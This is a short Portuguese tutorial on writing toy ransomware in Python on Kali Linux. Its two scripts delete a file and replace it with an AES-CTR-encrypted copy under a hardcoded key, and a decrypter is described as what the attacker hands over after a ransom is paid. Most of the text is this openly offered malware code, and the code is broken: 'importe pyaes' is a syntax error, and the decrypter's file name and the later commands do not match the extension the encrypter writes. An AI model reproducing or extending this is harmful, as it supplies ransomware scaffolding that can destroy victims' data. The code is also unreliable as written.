# Criando um Ransomware com python

### Ferramentas

- Kali Linux
- vim

### Configuração Ransoware

No terminal do kali linux crie um arquivo que servira de exemplo para o ataque: vim dados_teste.txt
Dentro do aquivo dados_teste.txt adicione um dado como: "Dados importantes da minha empresa." 
Agora crie um comando em python para encriptografar o arquivo dados_teste.txt: vim encrypter.py
Alimente com esses dados:

import os         # para importar o sestema operacional
importe pyaes     # para importar biblioteca pythom
## abrir o arquivo a ser criptografado
file_name = 'dados_teste.txt'
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + '.ransomwarattack'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

Agora fazer um arquivo para desincreptar, que o atacante forneceria para quem sofreu o ataque mediante a pagamento do resgate: vim decrypter.py

import os        # para importar o sestema operacional
import pyaes     # para importar biblioteca pythom

## abrir o arquivo criptografado
file_name = 'teste.txt.ransomwarattack'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

## chave para descriptografia
key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

## remover o arquivo criptografado
os.remove(file_name)

## criar o arquivo descriptografado
new_file = 'dados_teste.txt'
new_file = open(f'{new_file}', 'wb')
new_file.write(decrypt_data)
new_file.close()

no terminal para cryptografar os dados_test.txt utilize o camando: python encrypter.py
agora abra o arquivo dados_teste.txt.ransowaratack para ver os dados encryptografados: vim  dados_teste.txt.ransowaratack
e agora para desincryptografar e deixar os dados original e legivel novamente utilize o comando: python decrypter.py
e assim terminamos o ataque de Ransoware.

